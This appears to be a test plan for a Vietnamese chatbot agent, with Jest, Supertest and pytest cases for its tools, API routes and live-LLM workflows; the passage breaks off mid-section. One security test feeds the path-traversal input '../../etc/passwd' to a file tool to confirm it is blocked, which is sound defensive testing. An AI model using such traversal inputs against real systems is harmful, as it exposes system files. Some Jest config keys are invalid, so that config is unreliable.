# TEST PLAN — Chatbot Agent

> **Stack:** Jest (Node.js) + Supertest (HTTP) + pytest (Python RAG)  
> **Scope:** 60+ tools, agent workflow, RAG multi-strategy, API endpoints  
> **Goal:** Đảm bảo mọi tool chạy đúng, agent có reasoning thông minh, workflow chuẩn

---

## 1. CHIẾN LƯỢC TỔNG QUAN

```
┌─────────────────────────────────────────────────────────┐
│                    TEST PYRAMID                         │
│                                                         │
│              ┌───────────────┐                          │
│              │  E2E / Agent  │  ← 10% (chậm, đắt)     │
│              │  Workflow     │                          │
│          ┌───┴───────────────┴───┐                      │
│          │  Integration Tests    │  ← 30% (API, DB)    │
│          │  (Supertest + real)   │                      │
│      ┌───┴───────────────────────┴───┐                  │
│      │       Unit Tests              │  ← 60% (nhanh)  │
│      │  (Tools mocked dependencies)  │                  │
│      └───────────────────────────────┘                  │
└─────────────────────────────────────────────────────────┘
```

### 1.1 Nguyên tắc

| Nguyên tắc      | Áp dụng                                                             |
| --------------- | ------------------------------------------------------------------- |
| **Isolation**   | Mỗi tool test phải mock API bên ngoài (không call thật)             |
| **Determinism** | Kết quả nhất quán, không phụ thuộc network/thời gian thực           |
| **Coverage**    | ≥ 80% lines cho tools, ≥ 70% cho services                           |
| **Speed**       | Unit tests < 100ms/test; Integration < 5s/test                      |
| **Real agent**  | Workflow tests dùng LLM thật (gpt-4o) với câu hỏi có đáp án rõ ràng |

### 1.2 Cấu trúc thư mục test

```
agent/
├── backend/
│   └── __tests__/
│       ├── unit/
│       │   ├── tools/
│       │   │   ├── api_call.test.js
│       │   │   ├── automation.test.js
│       │   │   ├── calendar.test.js
│       │   │   ├── calculate_math.test.js
│       │   │   ├── current_time.test.js
│       │   │   ├── document_rag.test.js
│       │   │   ├── email.test.js
│       │   │   ├── file.test.js
│       │   │   ├── finance.test.js
│       │   │   ├── message_chat.test.js
│       │   │   ├── task_execute.test.js
│       │   │   ├── utility.test.js
│       │   │   └── web_search.test.js
│       │   └── services/
│       │       ├── agent.service.test.js
│       │       └── rag.service.test.js
│       ├── integration/
│       │   ├── chat.route.test.js
│       │   ├── document.route.test.js
│       │   └── health.route.test.js
│       └── workflow/
│           ├── tool_selection.test.js
│           ├── multi_turn.test.js
│           ├── error_recovery.test.js
│           └── complex_tasks.test.js
├── rag/
│   └── tests/
│       ├── test_ingestion.py
│       ├── test_retrievers.py
│       ├── test_rag_workflow.py
│       └── test_api.py
├── jest.config.js
└── jest.setup.js
```

---

## 2. SETUP & CONFIGURATION

### 2.1 jest.config.js

```javascript
// jest.config.js
export default {
    testEnvironment: 'node',
    transform: { '^.+\\.js$': ['babel-jest', { presets: ['@babel/preset-env'] }] },
    setupFilesAfterFramework: ['./jest.setup.js'],
    testMatch: ['**/__tests__/**/*.test.js'],
    collectCoverageFrom: ['backend/**/*.js', '!backend/server.js'],
    coverageThresholds: {
        global: { lines: 80, functions: 80, branches: 70 },
    },
    testTimeout: 10000,
};
```

### 2.2 jest.setup.js — Global mocks

```javascript
// jest.setup.js
import { jest } from '@jest/globals';

// Mock logger toàn cục — tránh noise trong test output
jest.mock('./backend/config/tool.config.js', () => ({
    logger: { info: jest.fn(), error: jest.fn(), warn: jest.fn() },
    withRetry: (fn) => fn(), // Bỏ retry logic trong unit tests
    TOOL_TIMEOUT: 5000,
    ok: (data) => JSON.stringify({ success: true, data }),
    fail: (msg) => JSON.stringify({ success: false, error: msg }),
}));
```

### 2.3 Packages cần cài

```bash
pnpm add -D jest @jest/globals babel-jest @babel/preset-env \
           supertest nock jest-mock-extended \
           @jest/coverage-reporter
# Python RAG
pip install pytest pytest-asyncio httpx pytest-cov
```

---

## 3. UNIT TESTS — TOOLS

> **Pattern chung cho mỗi tool test:**
>
> 1. Mock HTTP / external SDK
> 2. Happy path — input hợp lệ → output đúng format
> 3. Error path — API lỗi → trả về `fail(message)` không throw
> 4. Schema validation — input sai type/thiếu field → Zod error

---

### 3.1 `calculate_math` — KHÔNG cần mock (pure)

```javascript
// __tests__/unit/tools/calculate_math.test.js
describe('calculate_math tool', () => {
    let tool;
    beforeAll(async () => {
        ({ tool } = await import('../../../backend/tools/calculate_math.js'));
    });

    const cases = [
        { expr: '2 + 2', expected: 4 },
        { expr: 'sqrt(144)', expected: 12 },
        { expr: 'sin(PI/2)', expected: 1 },
        { expr: 'log(1000, 10)', expected: 3 },
        { expr: '[[1,2],[3,4]] * [[5],[6]]', expected: '[[17],[39]]' }, // matrix
        { expr: '10!', expected: 3628800 },
        { expr: '(3+4i) * (1-2i)', expected: '11-2i' }, // complex
    ];

    test.each(cases)('$expr = $expected', async ({ expr, expected }) => {
        const result = JSON.parse(await tool.func({ expression: expr }));
        expect(result.success).toBe(true);
        expect(String(result.data)).toContain(String(expected));
    });

    test('division by zero returns fail', async () => {
        const result = JSON.parse(await tool.func({ expression: '1/0' }));
        // Math.js trả Infinity, không throw — agent phải xử lý
        expect(result).toBeDefined();
    });

    test('invalid expression returns fail', async () => {
        const result = JSON.parse(await tool.func({ expression: 'not_a_function(x)' }));
        expect(result.success).toBe(false);
    });
});
```

---

### 3.2 `current_time` — KHÔNG cần mock

```javascript
describe('current_time tool', () => {
    test('returns time for Asia/Ho_Chi_Minh', async () => {
        const result = JSON.parse(await tool.func({ timezone: 'Asia/Ho_Chi_Minh' }));
        expect(result.success).toBe(true);
        expect(result.data).toMatch(/\d{4}-\d{2}-\d{2}/); // có date
    });

    test('returns time for America/New_York', async () => {
        const result = JSON.parse(await tool.func({ timezone: 'America/New_York' }));
        expect(result.success).toBe(true);
    });

    test('invalid timezone returns fail', async () => {
        const result = JSON.parse(await tool.func({ timezone: 'Invalid/Zone' }));
        expect(result.success).toBe(false);
    });
});
```

---

### 3.3 `web_search` — Mock Tavily

```javascript
import nock from 'nock';

describe('web_search tool', () => {
    beforeEach(() => {
        nock('https://api.tavily.com')
            .post('/search')
            .reply(200, {
                results: [
                    { title: 'Test Result', url: 'https://example.com', content: 'Test content' },
                    { title: 'Result 2', url: 'https://test.com', content: 'More content' },
                ],
                answer: 'Summarized answer',
            });
    });

    test('happy path — returns formatted results', async () => {
        const result = JSON.parse(await tool.func({ query: 'Node.js testing best practices' }));
        expect(result.success).toBe(true);
        expect(result.data.results).toHaveLength(2);
        expect(result.data.answer).toBe('Summarized answer');
    });

    test('empty results returns graceful response', async () => {
        nock.cleanAll();
        nock('https://api.tavily.com').post('/search').reply(200, { results: [], answer: '' });
        const result = JSON.parse(await tool.func({ query: 'xyzzy_nonexistent_12345' }));
        expect(result.success).toBe(true);
    });

    test('API error returns fail', async () => {
        nock.cleanAll();
        nock('https://api.tavily.com').post('/search').replyWithError('Network Error');
        const result = JSON.parse(await tool.func({ query: 'test' }));
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/network|error/i);
    });

    test('invalid API key returns fail', async () => {
        nock.cleanAll();
        nock('https://api.tavily.com').post('/search').reply(401, { error: 'Unauthorized' });
        const result = JSON.parse(await tool.func({ query: 'test' }));
        expect(result.success).toBe(false);
    });
});
```

---

### 3.4 `email` — Mock SMTP/IMAP

```javascript
import nodemailer from 'nodemailer';
import { ImapFlow } from 'imapflow';
jest.mock('nodemailer');
jest.mock('imapflow');

describe('email tools', () => {
    describe('send_email', () => {
        test('sends with required fields', async () => {
            const mockSendMail = jest.fn().mockResolvedValue({ messageId: 'test-id-123' });
            nodemailer.createTransport.mockReturnValue({ sendMail: mockSendMail });

            const result = JSON.parse(
                await sendEmailTool.func({
                    to: 'recipient@example.com',
                    subject: 'Test Subject',
                    body: 'Hello World',
                }),
            );

            expect(result.success).toBe(true);
            expect(mockSendMail).toHaveBeenCalledWith(
                expect.objectContaining({ to: 'recipient@example.com', subject: 'Test Subject' }),
            );
        });

        test('sends with CC, BCC, HTML body', async () => {
            const mockSendMail = jest.fn().mockResolvedValue({ messageId: 'id' });
            nodemailer.createTransport.mockReturnValue({ sendMail: mockSendMail });

            const result = JSON.parse(
                await sendEmailTool.func({
                    to: 'a@test.com',
                    subject: 'Sub',
                    body: '<b>HTML</b>',
                    cc: 'b@test.com',
                    bcc: 'c@test.com',
                    isHtml: true,
                }),
            );
            expect(result.success).toBe(true);
        });

        test('SMTP error returns fail', async () => {
            nodemailer.createTransport.mockReturnValue({
                sendMail: jest.fn().mockRejectedValue(new Error('SMTP connection refused')),
            });
            const result = JSON.parse(
                await sendEmailTool.func({
                    to: 'a@test.com',
                    subject: 'Sub',
                    body: 'Body',
                }),
            );
            expect(result.success).toBe(false);
        });
    });

    describe('read_emails', () => {
        test('returns emails list', async () => {
            ImapFlow.mockImplementation(() => ({
                connect: jest.fn(),
                getMailboxLock: jest.fn().mockResolvedValue({ release: jest.fn() }),
                fetch: jest.fn().mockReturnValue(
                    (async function* () {
                        yield {
                            envelope: { subject: 'Test', from: [{ address: 'a@b.com' }], date: new Date() },
                            uid: 1,
                        };
                    })(),
                ),
                logout: jest.fn(),
            }));

            const result = JSON.parse(await readEmailsTool.func({ limit: 5 }));
            expect(result.success).toBe(true);
            expect(result.data).toBeInstanceOf(Array);
        });
    });

    describe('search_emails', () => {
        test('searches by keyword', async () => {
            /* similar mock pattern */
        });
        test('searches by sender', async () => {
            /* ... */
        });
        test('searches by date range', async () => {
            /* ... */
        });
    });
});
```

---

### 3.5 `calendar` — Mock Cal.com API

```javascript
import nock from 'nock';

const CAL_BASE = 'https://api.cal.com';

describe('calendar tools', () => {
    describe('get_event_types', () => {
        test('returns event types list', async () => {
            nock(CAL_BASE)
                .get('/v1/event-types')
                .query(true)
                .reply(200, {
                    event_types: [{ id: 1, title: 'Meeting 30min', length: 30 }],
                });
            const result = JSON.parse(await getEventTypesTool.func({}));
            expect(result.success).toBe(true);
            expect(result.data.event_types).toHaveLength(1);
        });
    });

    describe('book_event', () => {
        test('books successfully with valid input', async () => {
            nock(CAL_BASE).post('/v1/bookings').reply(200, {
                uid: 'booking-uid-123',
                status: 'ACCEPTED',
                startTime: '2026-04-21T09:00:00Z',
            });
            const result = JSON.parse(
                await bookEventTool.func({
                    eventTypeId: 1,
                    start: '2026-04-21T09:00:00Z',
                    name: 'Test User',
                    email: 'test@example.com',
                }),
            );
            expect(result.success).toBe(true);
            expect(result.data.status).toBe('ACCEPTED');
        });

        test('returns fail for past datetime', async () => {
            nock(CAL_BASE).post('/v1/bookings').reply(400, { message: 'Time slot unavailable' });
            const result = JSON.parse(
                await bookEventTool.func({
                    eventTypeId: 1,
                    start: '2020-01-01T09:00:00Z',
                    name: 'Test',
                    email: 'test@test.com',
                }),
            );
            expect(result.success).toBe(false);
        });
    });

    describe('cancel_booking', () => {
        test('cancels with reason', async () => {
            nock(CAL_BASE).delete('/v1/bookings/uid-123').reply(200, { status: 'CANCELLED' });
            const result = JSON.parse(
                await cancelBookingTool.func({
                    uid: 'uid-123',
                    reason: 'Meeting rescheduled',
                }),
            );
            expect(result.success).toBe(true);
        });
    });

    describe('check_availability', () => {
        test('returns available slots', async () => {
            nock(CAL_BASE)
                .get('/v1/slots')
                .query(true)
                .reply(200, {
                    slots: { '2026-04-21': [{ time: '09:00' }, { time: '10:00' }] },
                });
            const result = JSON.parse(
                await checkAvailabilityTool.func({
                    eventTypeId: 1,
                    startTime: '2026-04-21T00:00:00Z',
                    endTime: '2026-04-21T23:59:00Z',
                }),
            );
            expect(result.success).toBe(true);
        });
    });
});
```

---

### 3.6 `task_execute` — Mock Notion SDK

```javascript
import { Client } from '@notionhq/client';
jest.mock('@notionhq/client');

describe('task tools (Notion)', () => {
    describe('create_task', () => {
        test('creates task with priority and deadline', async () => {
            const mockCreate = jest.fn().mockResolvedValue({ id: 'page-id-123', url: 'https://notion.so/...' });
            Client.mockImplementation(() => ({ pages: { create: mockCreate } }));

            const result = JSON.parse(
                await createTaskTool.func({
                    title: 'Write unit tests',
                    priority: 'high',
                    deadline: '2026-04-30',
                    tags: ['testing', 'dev'],
                }),
            );

            expect(result.success).toBe(true);
            expect(mockCreate).toHaveBeenCalledWith(
                expect.objectContaining({ properties: expect.objectContaining({}) }),
            );
        });

        test('creates task with minimum required fields', async () => {
            Client.mockImplementation(() => ({
                pages: { create: jest.fn().mockResolvedValue({ id: 'id' }) },
            }));
            const result = JSON.parse(await createTaskTool.func({ title: 'Minimal task' }));
            expect(result.success).toBe(true);
        });
    });

    describe('list_tasks', () => {
        test('filters by status "in_progress"', async () => {
            const mockQuery = jest.fn().mockResolvedValue({
                results: [{ id: '1', properties: { Status: { select: { name: 'In Progress' } } } }],
            });
            Client.mockImplementation(() => ({ databases: { query: mockQuery } }));

            const result = JSON.parse(await listTasksTool.func({ status: 'in_progress' }));
            expect(result.success).toBe(true);
            expect(result.data).toHaveLength(1);
        });
    });

    describe('update_task', () => {
        test('updates task status to done', async () => {
            const mockUpdate = jest.fn().mockResolvedValue({ id: 'page-id' });
            Client.mockImplementation(() => ({ pages: { update: mockUpdate } }));

            const result = JSON.parse(
                await updateTaskTool.func({
                    taskId: 'page-id-123',
                    status: 'done',
                }),
            );
            expect(result.success).toBe(true);
        });
    });
});
```

---

### 3.7 `file` — Mock fs module

```javascript
import * as fs from 'fs/promises';
jest.mock('fs/promises');

describe('file tools', () => {
    const BASE_DIR = '/workspace';

    describe('read_file', () => {
        test('reads text file', async () => {
            fs.readFile.mockResolvedValue('file content here');
            const result = JSON.parse(await readFileTool.func({ path: 'notes.txt' }));
            expect(result.success).toBe(true);
            expect(result.data).toBe('file content here');
        });

        test('reads JSON file as parsed object', async () => {
            fs.readFile.mockResolvedValue('{"key": "value"}');
            const result = JSON.parse(await readFileTool.func({ path: 'config.json' }));
            expect(result.success).toBe(true);
        });

        test('returns fail for non-existent file', async () => {
            fs.readFile.mockRejectedValue(Object.assign(new Error('ENOENT'), { code: 'ENOENT' }));
            const result = JSON.parse(await readFileTool.func({ path: 'missing.txt' }));
            expect(result.success).toBe(false);
        });

        // SECURITY TEST
        test('SECURITY: path traversal blocked', async () => {
            const result = JSON.parse(await readFileTool.func({ path: '../../etc/passwd' }));
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/không được phép|invalid|forbidden/i);
        });
    });

    describe('write_file', () => {
        test('creates new file', async () => {
            fs.writeFile.mockResolvedValue(undefined);
            const result = JSON.parse(
                await writeFileTool.func({
                    path: 'output.txt',
                    content: 'Hello World',
                }),
            );
            expect(result.success).toBe(true);
        });

        test('overwrites existing file with confirm flag', async () => {
            fs.writeFile.mockResolvedValue(undefined);
            const result = JSON.parse(
                await writeFileTool.func({
                    path: 'existing.txt',
                    content: 'Updated',
                    overwrite: true,
                }),
            );
            expect(result.success).toBe(true);
        });
    });

    describe('list_files', () => {
        test('lists directory contents with metadata', async () => {
            fs.readdir.mockResolvedValue(['file1.txt', 'folder/', 'data.json']);
            const result = JSON.parse(await listFilesTool.func({ directory: '.' }));
            expect(result.success).toBe(true);
            expect(result.data).toHaveLength(3);
        });
    });

    describe('search_files', () => {
        test('finds files by name pattern', async () => {
            /* ... */
        });
        test('finds files by content keyword', async () => {
            /* ... */
        });
    });
});
```

---

### 3.8 `automation` — Mock cron & file persistence

```javascript
import cron from 'node-cron';
import * as fs from 'fs/promises';
jest.mock('node-cron');
jest.mock('fs/promises');

describe('automation tools', () => {
    describe('create_automation', () => {
        test('creates cron with valid schedule', async () => {
            cron.validate.mockReturnValue(true);
            cron.schedule.mockReturnValue({ id: 'cron-1', destroy: jest.fn() });
            fs.writeFile.mockResolvedValue(undefined);

            const result = JSON.parse(
                await createAutomationTool.func({
                    name: 'Daily Report',
                    schedule: '0 9 * * *', // 9am every day
                    action: 'send_message',
                    actionParams: { channel: 'general', message: 'Good morning!' },
                }),
            );

            expect(result.success).toBe(true);
            expect(cron.schedule).toHaveBeenCalledWith('0 9 * * *', expect.any(Function));
        });

        test('creates cron from natural language "every day at 9am"', async () => {
            // Agent converts NL → cron expression
            const result = JSON.parse(
                await createAutomationTool.func({
                    name: 'Morning standup',
                    scheduleNL: 'every weekday at 9am',
                    action: 'send_message',
                    actionParams: {},
                }),
            );
            // Should succeed OR return meaningful error
            expect(result).toBeDefined();
        });

        test('rejects invalid cron expression', async () => {
            cron.validate.mockReturnValue(false);
            const result = JSON.parse(
                await createAutomationTool.func({
                    name: 'Bad cron',
                    schedule: 'not-a-cron',
                    action: 'send_message',
                    actionParams: {},
                }),
            );
            expect(result.success).toBe(false);
        });
    });

    describe('persistence — recovery on restart', () => {
        test('automations are saved to automations.json', async () => {
            cron.validate.mockReturnValue(true);
            cron.schedule.mockReturnValue({ destroy: jest.fn() });
            const writeFileSpy = jest.spyOn(fs, 'writeFile');

            await createAutomationTool.func({
                name: 'Test',
                schedule: '* * * * *',
                action: 'test',
                actionParams: {},
            });

            expect(writeFileSpy).toHaveBeenCalledWith(
                expect.stringContaining('automations.json'),
                expect.stringContaining('"name":"Test"'),
                'utf-8',
            );
        });
    });

    describe('list_automations', () => {
        test('returns all active automations', async () => {
            fs.readFile.mockResolvedValue(
                JSON.stringify([
                    { id: '1', name: 'Job A', schedule: '* * * * *', active: true },
                    { id: '2', name: 'Job B', schedule: '0 * * * *', active: false },
                ]),
            );
            const result = JSON.parse(await listAutomationsTool.func({}));
            expect(result.success).toBe(true);
            expect(result.data).toHaveLength(2);
        });
    });

    describe('delete_automation', () => {
        test('stops cron and removes from persistence', async () => {
            /* ... */
        });
    });
});
```

---

### 3.9 `message_chat` — Mock Mattermost API

```javascript
import nock from 'nock';

describe('message_chat tools', () => {
    const MM_URL = process.env.MATTERMOST_BOT_URL || 'https://mattermost.example.com';

    describe('send_message', () => {
        test('sends to channel with markdown', async () => {
            nock(MM_URL).post('/posts').reply(201, { id: 'post-id', message: '**Hello**' });
            const result = JSON.parse(
                await sendMessageTool.func({
                    channel: 'general',
                    message: '**Hello World**',
                }),
            );
            expect(result.success).toBe(true);
        });

        test('sends long message (> 4000 chars) — splits or truncates', async () => {
            const longMsg = 'x'.repeat(5000);
            nock(MM_URL).post('/posts').reply(201, { id: 'post-id' });
            const result = JSON.parse(await sendMessageTool.func({ channel: 'general', message: longMsg }));
            expect(result.success).toBe(true);
        });

        test('channel not found returns fail', async () => {
            nock(MM_URL).post('/posts').reply(404, { message: 'Channel not found' });
            const result = JSON.parse(await sendMessageTool.func({ channel: 'nonexistent', message: 'Hi' }));
            expect(result.success).toBe(false);
        });
    });

    describe('schedule_message', () => {
        test('schedules message for future time', async () => {
            const result = JSON.parse(
                await scheduleMessageTool.func({
                    channel: 'general',
                    message: 'Reminder!',
                    sendAt: '2026-04-21T09:00:00+07:00',
                }),
            );
            expect(result.success).toBe(true);
            expect(result.data.scheduledId).toBeDefined();
        });

        test('rejects past datetime', async () => {
            const result = JSON.parse(
                await scheduleMessageTool.func({
                    channel: 'general',
                    message: 'Too late',
                    sendAt: '2020-01-01T00:00:00Z',
                }),
            );
            expect(result.success).toBe(false);
        });

        test('scheduled message persists to JSON file', async () => {
            /* verify scheduled_messages.json is written */
        });
    });

    describe('cancel_scheduled_message', () => {
        test('cancels existing scheduled message', async () => {
            /* ... */
        });
        test('returns fail for non-existent schedule id', async () => {
            /* ... */
        });
    });
});
```

---

### 3.10 `finance` — Mock Google Sheets API

```javascript
import { google } from 'googleapis';
jest.mock('googleapis');

describe('finance tools', () => {
    describe('add_expense', () => {
        test('appends expense row to sheet', async () => {
            const mockAppend = jest.fn().mockResolvedValue({ data: { updates: { updatedRows: 1 } } });
            google.sheets.mockReturnValue({ spreadsheets: { values: { append: mockAppend } } });

            const result = JSON.parse(
                await addExpenseTool.func({
                    amount: 150000,
                    category: 'Food',
                    description: 'Lunch',
                    date: '2026-04-20',
                }),
            );

            expect(result.success).toBe(true);
            expect(mockAppend).toHaveBeenCalledWith(
                expect.objectContaining({ range: expect.any(String), valueInputOption: 'USER_ENTERED' }),
            );
        });

        test('negative amount returns fail', async () => {
            const result = JSON.parse(
                await addExpenseTool.func({
                    amount: -100,
                    category: 'Test',
                    description: 'Test',
                    date: '2026-04-20',
                }),
            );
            expect(result.success).toBe(false);
        });
    });

    describe('get_expense_summary', () => {
        test('returns monthly totals by category', async () => {
            const mockGet = jest.fn().mockResolvedValue({
                data: {
                    values: [
                        ['2026-04-20', 'Food', '150000', 'Lunch'],
                        ['2026-04-19', 'Transport', '50000', 'Grab'],
                    ],
                },
            });
            google.sheets.mockReturnValue({ spreadsheets: { values: { get: mockGet } } });

            const result = JSON.parse(await getExpenseSummaryTool.func({ month: '2026-04' }));
            expect(result.success).toBe(true);
            expect(result.data.total).toBe(200000);
            expect(result.data.byCategory.Food).toBe(150000);
        });
    });
});
```

---

### 3.11 `utility` — Mix pure & mocked

```javascript
describe('utility tools', () => {
    describe('translate_text', () => {
        test('translates Vietnamese to English', async () => {
            nock('https://translation.googleapis.com')
                .post(/./)
                .reply(200, { data: { translations: [{ translatedText: 'Hello World' }] } });
            const result = JSON.parse(
                await translateTool.func({
                    text: 'Xin chào thế giới',
                    targetLanguage: 'en',
                }),
            );
            expect(result.success).toBe(true);
            expect(result.data.translatedText).toBe('Hello World');
        });
    });

    describe('generate_qr_code', () => {
        test('generates QR from URL', async () => {
            const result = JSON.parse(await generateQRTool.func({ content: 'https://example.com' }));
            expect(result.success).toBe(true);
            expect(result.data).toMatch(/^data:image\/png;base64,/); // base64 image
        });

        test('generates QR from text', async () => {
            const result = JSON.parse(await generateQRTool.func({ content: 'Hello World' }));
            expect(result.success).toBe(true);
        });

        test('empty content returns fail', async () => {
            const result = JSON.parse(await generateQRTool.func({ content: '' }));
            expect(result.success).toBe(false);
        });
    });

    describe('convert_timezone', () => {
        test('converts Ho Chi Minh to UTC', async () => {
            const result = JSON.parse(
                await convertTimezoneTool.func({
                    datetime: '2026-04-20T09:00:00',
                    fromTimezone: 'Asia/Ho_Chi_Minh',
                    toTimezone: 'UTC',
                }),
            );
            expect(result.success).toBe(true);
            expect(result.data).toContain('02:00'); // UTC = ICT - 7h
        });
    });
});
```

---

### 3.12 `api_call` — Generic HTTP

```javascript
describe('api_call tool', () => {
    test('GET request with query params', async () => {
        nock('https://api.example.com').get('/users').query({ page: '1' }).reply(200, { users: [] });
        const result = JSON.parse(
            await apiCallTool.func({
                method: 'GET',
                url: 'https://api.example.com/users',
                params: { page: 1 },
            }),
        );
        expect(result.success).toBe(true);
    });

    test('POST request with JSON body', async () => {
        nock('https://api.example.com').post('/data', { key: 'value' }).reply(201, { id: 1 });
        const result = JSON.parse(
            await apiCallTool.func({
                method: 'POST',
                url: 'https://api.example.com/data',
                body: { key: 'value' },
            }),
        );
        expect(result.success).toBe(true);
    });

    test('custom headers are sent', async () => {
        nock('https://api.example.com')
            .get('/protected')
            .matchHeader('Authorization', 'Bearer token123')
            .reply(200, { ok: true });
        const result = JSON.parse(
            await apiCallTool.func({
                method: 'GET',
                url: 'https://api.example.com/protected',
                headers: { Authorization: 'Bearer token123' },
            }),
        );
        expect(result.success).toBe(true);
    });

    test('timeout returns fail', async () => {
        nock('https://api.example.com').get('/slow').delay(6000).reply(200, {});
        const result = JSON.parse(
            await apiCallTool.func({
                method: 'GET',
                url: 'https://api.example.com/slow',
            }),
        );
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/timeout/i);
    });

    test('404 response captured correctly', async () => {
        nock('https://api.example.com').get('/missing').reply(404, { message: 'Not Found' });
        const result = JSON.parse(
            await apiCallTool.func({
                method: 'GET',
                url: 'https://api.example.com/missing',
            }),
        );
        // Tool nên trả về status code 404 trong data, không fail silently
        expect(result.data?.status ?? result.error).toBeDefined();
    });
});
```

---

### 3.13 `document_rag` — Mock RAG Service

```javascript
import axios from 'axios';
jest.mock('axios');

describe('document_rag tool', () => {
    test('queries RAG service and returns answer', async () => {
        axios.post.mockResolvedValue({
            data: {
                answer: 'The document says...',
                sources: [{ title: 'doc.pdf', page: 1 }],
                confidence: 0.92,
                selectedStrategies: ['traditional'],
            },
        });

        const result = JSON.parse(
            await documentRagTool.func({
                query: 'What is the main topic of the uploaded document?',
                strategy: 'traditional',
            }),
        );
        expect(result.success).toBe(true);
        expect(result.data.answer).toBeDefined();
        expect(result.data.sources).toBeInstanceOf(Array);
    });

    test('RAG service unavailable returns fail', async () => {
        axios.post.mockRejectedValue(new Error('ECONNREFUSED'));
        const result = JSON.parse(await documentRagTool.func({ query: 'test' }));
        expect(result.success).toBe(false);
    });

    test('query with all 3 strategies', async () => {
        axios.post.mockResolvedValue({ data: { answer: 'Answer', sources: [], confidence: 0.8 } });
        const result = JSON.parse(
            await documentRagTool.func({
                query: 'Complex query needing multiple strategies',
                strategy: 'all',
                topK: 10,
            }),
        );
        expect(result.success).toBe(true);
    });
});
```

---

## 4. INTEGRATION TESTS — API ENDPOINTS

```javascript
// __tests__/integration/chat.route.test.js
import request from 'supertest';
import app from '../../../backend/server.js';
import { AgentService } from '../../../backend/services/agent.service.js';

jest.mock('../../../backend/services/agent.service.js');

describe('POST /api/chat/agent', () => {
    beforeEach(() => {
        AgentService.prototype.chat.mockResolvedValue([
            { role: 'assistant', content: 'Xin chào! Tôi có thể giúp gì cho bạn?' },
        ]);
    });

    test('200 — basic query returns answer', async () => {
        const res = await request(app).post('/api/chat/agent').send({ query: 'Xin chào', conversationId: 'session-1' });

        expect(res.status).toBe(200);
        expect(res.body.answer).toBeDefined();
        expect(res.body.conversationId).toBe('session-1');
        expect(res.body.timestamp).toBeDefined();
    });

    test('200 — creates new conversationId if not provided', async () => {
        const res = await request(app).post('/api/chat/agent').send({ query: 'Hello' });

        expect(res.status).toBe(200);
        expect(res.body.conversationId).toBeDefined();
    });

    test('400 — missing query field', async () => {
        const res = await request(app).post('/api/chat/agent').send({});
        expect(res.status).toBe(400);
    });

    test('400 — empty query string', async () => {
        const res = await request(app).post('/api/chat/agent').send({ query: '' });
        expect(res.status).toBe(400);
    });

    test('conversation history is maintained across requests', async () => {
        const convId = 'history-test-session';

        await request(app).post('/api/chat/agent').send({ query: 'My name is Quyên', conversationId: convId });
        await request(app).post('/api/chat/agent').send({ query: 'What is my name?', conversationId: convId });

        // Verify AgentService received both messages in history
        const secondCallMessages = AgentService.prototype.chat.mock.calls[1][0];
        expect(secondCallMessages.some((m) => m.content.includes('Quyên'))).toBe(true);
    });

    test('conversation window caps at 10 messages', async () => {
        const convId = 'window-test';
        for (let i = 0; i < 12; i++) {
            await request(app)
                .post('/api/chat/agent')
                .send({ query: `Message ${i}`, conversationId: convId });
        }
        const lastCallMessages = AgentService.prototype.chat.mock.calls.at(-1)[0];
        expect(lastCallMessages.length).toBeLessThanOrEqual(11); // 10 history + 1 current
    });
});

describe('POST /api/chat (RAG only)', () => {
    test('returns RAG answer without tool execution', async () => {
        const res = await request(app)
            .post('/api/chat')
            .send({ query: 'Tell me about the uploaded documents', strategy: 'traditional' });
        expect(res.status).toBe(200);
        expect(res.body.answer).toBeDefined();
        expect(res.body.sources).toBeInstanceOf(Array);
    });
});

describe('GET /api/health', () => {
    test('returns 200 with service status', async () => {
        const res = await request(app).get('/api/health');
        expect(res.status).toBe(200);
        expect(res.body.status).toBe('ok');
    });
});
```

---

## 5. AGENT WORKFLOW TESTS

> Các test này dùng **LLM thật** (gpt-4o) với input có **đáp án có thể verify**  
> Chạy riêng: `jest --testPathPattern=workflow --runInBand`  
> Timeout: 60s/test

### 5.1 Tool Selection — Agent chọn đúng tool

```javascript
// __tests__/workflow/tool_selection.test.js
import { AgentService } from '../../../backend/services/agent.service.js';

describe('Agent Tool Selection', () => {
    let agent;
    beforeAll(() => {
        agent = new AgentService();
    });

    // --- Math tool ---
    test('chọn calculate_math cho phép tính', async () => {
        const messages = [{ role: 'user', content: '512 * 1024 bằng bao nhiêu?' }];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        expect(answer).toContain('524288'); // correct answer
    }, 30000);

    test('tính toán phức tạp với sin và log', async () => {
        const messages = [{ role: 'user', content: 'Tính sin(π/6) + log₁₀(1000)' }];
        const result = await agent.chat(messages);
        expect(result.at(-1).content).toMatch(/3\.5|3,5/); // 0.5 + 3 = 3.5
    }, 30000);

    // --- Time tool ---
    test('chọn current_time cho câu hỏi về giờ', async () => {
        const messages = [{ role: 'user', content: 'Bây giờ là mấy giờ tại Tokyo?' }];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        expect(answer).toMatch(/\d{1,2}:\d{2}/); // has time pattern
        expect(answer.toLowerCase()).toMatch(/tokyo|japan/);
    }, 30000);

    // --- Web search tool ---
    test('chọn web_search cho thông tin mới nhất', async () => {
        const messages = [{ role: 'user', content: 'Giá Bitcoin hôm nay là bao nhiêu USD?' }];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        expect(answer).toMatch(/\$[\d,]+|\d+[\.,]\d+ USD/i); // has price pattern
    }, 45000);

    // --- QR tool ---
    test('chọn generate_qr_code và trả base64', async () => {
        const messages = [{ role: 'user', content: 'Tạo QR code cho URL https://example.com' }];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        // Agent phải confirm đã tạo QR và có output
        expect(answer.toLowerCase()).toMatch(/qr|tạo|đã/);
    }, 30000);

    // --- Timezone conversion ---
    test('chọn convert_timezone không dùng web search', async () => {
        const messages = [{ role: 'user', content: '9:00 AM giờ Việt Nam là mấy giờ ở London?' }];
        const result = await agent.chat(messages);
        expect(result.at(-1).content).toMatch(/2:00|3:00|02:00|03:00/); // UTC±1
    }, 30000);
});
```

---

### 5.2 Multi-turn Conversations — Context retention

```javascript
// __tests__/workflow/multi_turn.test.js
describe('Multi-turn Conversation', () => {
    test('nhớ context trong cùng session', async () => {
        const messages = [
            { role: 'user', content: 'Tôi cần tính 100 * 25' },
            { role: 'assistant', content: 'Kết quả là 2500' },
            { role: 'user', content: 'Cộng thêm 500 vào kết quả đó' },
        ];
        const result = await agent.chat(messages);
        expect(result.at(-1).content).toContain('3000');
    }, 30000);

